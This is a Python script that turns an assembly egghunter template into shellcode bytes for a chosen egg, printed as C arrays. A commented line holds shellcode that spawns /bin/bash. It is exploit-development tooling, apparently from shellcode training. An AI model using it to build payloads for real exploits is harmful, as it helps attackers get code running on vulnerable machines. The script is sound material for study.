#!/usr/bin/python3

import sys
import re
import subprocess

def usage():
	print("Usage: %s <egg>" % sys.argv[0])
	print()
	print("egg can be 0xNNNNNNNN or CCCC, for example: 0x12345678 or w00t")
	exit(1)

def dumpShellcodeFromFile(path):
	with open(path, "rb") as f:
		bs = f.read()
		i = 0x1000
		b1 = 0xff
		b2 = 0xff
		shellcode = ""
		while True:
			shellcode += "\\x%.2x" % bs[i]
			i += 1
			b1 = b2
			b2 = bs[i]
			if b1 == b2 == 0x00:
				break
	return '"'+shellcode[:-4]+'"'

if len(sys.argv) != 2:
	usage()

# make sure egg is in the correct format
egg_regex = re.compile("^((0x[0-9a-f]{8})|.{4})$")
egg = sys.argv[1]

if not egg_regex.match(egg):
	usage()

# convert "hex" egg to dword
if "0x" in egg and len(egg) == 10:
	egg_str = egg
	egg = b"".join([bytes([int(egg[i:i+2],16)]) for i in range(8,0,-2)])

# convert "char" egg to dword
else:
	egg = egg.encode()
	egg_str = "0x%.2x%.2x%.2x%.2x" % (egg[0], egg[1], egg[2], egg[3])
	egg = egg[::-1]

print("[*] Egg = %s" % egg_str)

# replace egg in template egghunter
with open("access_egghunter.nasm", "r") as f_in:
	with open("tmp.nasm", "w") as f_out:
		for line in f_in:
			if "<EGG>" in line:
				line = line.replace("<EGG>", egg_str)
			f_out.write(line)

# compile egghunter
print("[*] Assembling egghunter...")
subprocess.run("nasm -f elf32 -o tmp.o tmp.nasm", shell=True)

print("[*] Linking egghunter object...")
subprocess.run("ld -o tmp tmp.o", shell=True)

# dump shellcode of egghunter
print("[*] Dumping shellcode...")
sc = dumpShellcodeFromFile("tmp")
print()

print("char egg[] = \"%s\";" % ("".join(["\\x%.2x" % i for i in egg])))
print("char shellcode[] = ...")
#print("char shellcode[] = \"\\x31\\xc0\\xb0\\x68\\x50\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc0\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";")
print("char egghunter[] = %s;"%sc)

print()
print("[*] Cleaning temporary files...")
subprocess.run("rm -rf __pycache__ tmp.o tmp.nasm tmp", shell=True)
